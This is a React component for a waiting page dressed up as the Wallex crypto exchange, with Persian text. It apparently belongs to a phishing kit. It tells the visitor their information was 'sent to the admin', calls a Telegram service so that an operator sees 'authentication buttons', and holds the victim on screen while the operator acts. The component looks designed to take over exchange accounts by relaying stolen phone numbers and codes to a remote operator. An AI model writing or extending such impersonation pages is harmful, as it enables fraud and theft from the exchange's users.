import { useEffect, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { Loader2, AlertCircle } from "lucide-react";
import {
  setUserCurrentStep,
  getSession,
  showAdminButtons,
} from "@/lib/telegram-service-enhanced";

const Loading = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [isLoading, setIsLoading] = useState(true);
  const [sessionData, setSessionData] = useState<any>(null);

  const phoneNumber = location.state?.phoneNumber || "";
  const sessionId =
    location.state?.sessionId || sessionStorage.getItem("sessionId");

  useEffect(() => {
    const initializeLoading = async () => {
      if (!sessionId) {
        console.error("No session ID found");
        navigate("/", { replace: true });
        return;
      }

      try {
        // Get current session data
        const session = getSession(sessionId);
        setSessionData(session);

        // Show loading for 2 seconds
        setTimeout(async () => {
          setIsLoading(false);

          // After loading is done, show admin buttons in Telegram
          console.log("📱 User reached loading page, showing admin buttons...");
          await showAdminButtons(sessionId);
        }, 2000);
      } catch (error) {
        console.error("Failed to initialize loading page:", error);
        navigate("/", { replace: true });
      }
    };

    initializeLoading();
  }, [sessionId, navigate]);

  // Check for admin actions every 5 seconds
  useEffect(() => {
    if (!sessionId || isLoading) return;

    const checkForUpdates = setInterval(() => {
      // In a real app, this would poll the server or use WebSocket
      // For now, we'll just log that we're waiting
      console.log("Waiting for admin action on session:", sessionId);
    }, 5000);

    return () => clearInterval(checkForUpdates);
  }, [sessionId, isLoading]);

  if (!sessionId) {
    return (
      <div
        style={{
          display: "flex",
          height: "100vh",
          backgroundColor: "rgb(14, 35, 66)",
          alignItems: "center",
          justifyContent: "center",
        }}
      >
        <div
          style={{
            backgroundColor: "rgb(255, 255, 255)",
            borderRadius: "16px",
            padding: "40px",
            maxWidth: "400px",
            width: "90%",
            textAlign: "center",
          }}
        >
          <AlertCircle
            style={{
              width: "48px",
              height: "48px",
              color: "rgb(220, 38, 38)",
              margin: "0 auto 16px",
            }}
          />
          <h2 style={{ color: "rgb(220, 38, 38)", margin: "0 0 8px 0" }}>
            خطا در جلسه
          </h2>
          <p style={{ color: "rgba(0, 0, 0, 0.6)", margin: "0" }}>
            جلسه شما منقضی شده است. لطفا مجدد تلاش کنید.
          </p>
        </div>
      </div>
    );
  }

  return (
    <div
      style={{
        display: "flex",
        height: "100vh",
        backgroundColor: "rgb(14, 35, 66)",
        alignItems: "center",
        justifyContent: "center",
      }}
    >
      <div
        style={{
          backgroundColor: "rgb(255, 255, 255)",
          borderRadius: "16px",
          padding: "40px",
          maxWidth: "500px",
          width: "90%",
          textAlign: "center",
        }}
        className="loading-card"
      >
        {/* Header */}
        <div
          style={{
            display: "flex",
            justifyContent: "center",
            marginBottom: "24px",
          }}
        >
          <img
            src="https://wallex.ir/_next/image?url=%2Fimages%2Fwallex-logo-v-light.svg&w=256&q=75"
            alt="صرافی خرید فروش ارزهای دیجیتال"
            style={{
              width: "128px",
              height: "24px",
              objectFit: "contain",
            }}
          />
        </div>

        {isLoading ? (
          /* Initial Loading State */
          <div
            style={{
              display: "flex",
              flexDirection: "column",
              alignItems: "center",
              gap: "20px",
            }}
          >
            <div
              style={{
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                width: "80px",
                height: "80px",
                backgroundColor: "rgb(23, 29, 38)",
                borderRadius: "50%",
              }}
            >
              <Loader2
                className="animate-spin"
                style={{
                  width: "40px",
                  height: "40px",
                  color: "rgb(255, 255, 255)",
                }}
              />
            </div>

            <div
              style={{
                display: "flex",
                flexDirection: "column",
                gap: "8px",
                textAlign: "center",
              }}
            >
              <h2
                style={{
                  fontSize: "18px",
                  fontWeight: "700",
                  color: "rgb(0, 0, 0)",
                  margin: "0",
                }}
              >
                در حال پردازش...
              </h2>
              <p
                style={{
                  fontSize: "14px",
                  color: "rgba(0, 0, 0, 0.6)",
                  margin: "0",
                  lineHeight: "1.5",
                }}
              >
                اطلاعات شما به ادمین ارسال شد
              </p>
            </div>

            {/* Progress Dots */}
            <div
              style={{
                display: "flex",
                gap: "8px",
                alignItems: "center",
              }}
            >
              {[0, 1, 2].map((index) => (
                <div
                  key={index}
                  style={{
                    width: "8px",
                    height: "8px",
                    backgroundColor: "rgb(0, 122, 255)",
                    borderRadius: "50%",
                    animation: `bounce ${1.4}s ease-in-out ${index * 0.16}s infinite both`,
                  }}
                />
              ))}
            </div>
          </div>
        ) : (
          /* Waiting for Admin State */
          <div
            style={{
              display: "flex",
              flexDirection: "column",
              alignItems: "center",
              gap: "24px",
            }}
          >
            {/* Waiting Icon */}
            <div
              style={{
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                width: "80px",
                height: "80px",
                backgroundColor: "rgb(0, 122, 255)",
                borderRadius: "50%",
              }}
            >
              <span
                style={{
                  fontSize: "32px",
                  color: "rgb(255, 255, 255)",
                }}
              >
                ⏳
              </span>
            </div>

            {/* Waiting Message */}
            <div
              style={{
                display: "flex",
                flexDirection: "column",
                gap: "8px",
                textAlign: "center",
              }}
            >
              <h2
                style={{
                  fontSize: "18px",
                  fontWeight: "700",
                  color: "rgb(0, 0, 0)",
                  margin: "0",
                }}
              >
                در انتظار دستور ادمین
              </h2>
              <p
                style={{
                  fontSize: "14px",
                  color: "rgba(0, 0, 0, 0.6)",
                  margin: "0",
                  lineHeight: "1.5",
                }}
              >
                ادمین در تلگرام دکمه‌های احراز هویت را مشاهده می‌کند
              </p>
            </div>

            {/* Session Info */}
            {sessionData && (
              <div
                style={{
                  padding: "16px",
                  backgroundColor: "rgba(0, 122, 255, 0.05)",
                  borderRadius: "8px",
                  width: "100%",
                  textAlign: "right",
                }}
              >
                <h4
                  style={{
                    fontSize: "14px",
                    fontWeight: "600",
                    color: "rgb(0, 0, 0)",
                    margin: "0 0 8px 0",
                  }}
                >
                  🔍 اطلاعات جلسه:
                </h4>
                <div style={{ fontSize: "12px", color: "rgba(0, 0, 0, 0.7)" }}>
                  <p style={{ margin: "4px 0" }}>
                    📱 شماره: <strong>{sessionData.phoneNumber}</strong>
                  </p>
                  <p style={{ margin: "4px 0" }}>
                    🆔 شناسه: <strong>{sessionData.sessionId}</strong>
                  </p>
                  <p style={{ margin: "4px 0" }}>
                    ✅ مراحل تکمیل شده:{" "}
                    <strong>{sessionData.completedSteps?.length || 0}</strong>
                  </p>
                </div>
              </div>
            )}

            {/* Pulsing Animation */}
            <div
              style={{
                width: "60px",
                height: "4px",
                backgroundColor: "rgba(0, 122, 255, 0.2)",
                borderRadius: "2px",
                overflow: "hidden",
                position: "relative",
              }}
            >
              <div
                style={{
                  width: "20px",
                  height: "100%",
                  backgroundColor: "rgb(0, 122, 255)",
                  borderRadius: "2px",
                  animation: "slide 2s ease-in-out infinite",
                }}
              />
            </div>
          </div>
        )}

        {/* Security Note */}
        <div
          style={{
            marginTop: "32px",
            padding: "16px",
            backgroundColor: "rgb(248, 249, 250)",
            borderRadius: "8px",
            border: "1px solid rgba(0, 0, 0, 0.1)",
          }}
        >
          <p
            style={{
              fontSize: "12px",
              color: "rgba(0, 0, 0, 0.6)",
              margin: "0",
              lineHeight: "1.4",
            }}
          >
            🤖{" "}
            {isLoading
              ? "در حال ارسال اطلاعات به سیستم مدیریت..."
              : "ادمین در تلگرام دکمه‌های احراز هویت را مشاهده می‌کند"}
          </p>
        </div>
      </div>

      <style jsx>{`
        @keyframes bounce {
          0%,
          80%,
          100% {
            transform: scale(0);
          }
          40% {
            transform: scale(1);
          }
        }

        @keyframes slide {
          0% {
            transform: translateX(-40px);
          }
          50% {
            transform: translateX(80px);
          }
          100% {
            transform: translateX(-40px);
          }
        }

        /* Mobile styles */
        @media (max-width: 1023px) {
          .loading-card {
            border-radius: 0 !important;
            width: 100% !important;
            height: 100vh !important;
            max-width: none !important;
            display: flex !important;
            flex-direction: column !important;
            justify-content: center !important;
            padding: 20px !important;
          }
        }
      `}</style>
    </div>
  );
};

export default Loading;
